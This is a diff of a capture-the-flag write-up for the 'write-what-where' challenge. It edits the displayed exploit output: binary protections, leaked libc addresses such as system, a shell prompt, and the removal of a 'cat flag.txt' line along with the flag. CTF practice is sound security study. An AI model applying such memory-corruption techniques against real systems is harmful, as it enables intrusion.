@@ -153,18 +153,15 @@ write-what-where: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamical
 - Shell
     
     ```python
-    		Arch:     amd64-64-little
-        RELRO:    Partial RELRO
-        Stack:    Canary found
-        NX:       NX enabled
-        PIE:      PIE enabled
-    [*] Puts: 0x7f463d0fb9d0
-    [*] libc_base: 0x7f463d07b000
-    [*] system: 0x7f463d0caa60
-    [*] stdin: 0x7f463d25b9a0
-    [*] stdout: 0x7f463d25c6c0
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    [*] Puts: 0x7fb7129f29d0
+    [*] libc_base: 0x7fb712972000
+    [*] system: 0x7fb7129c1a60
+    [*] stdin: 0x7fb712b529a0
     [*] Switching to interactive mode
-    $ cat flag.txt
-    DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}
     $
     ```
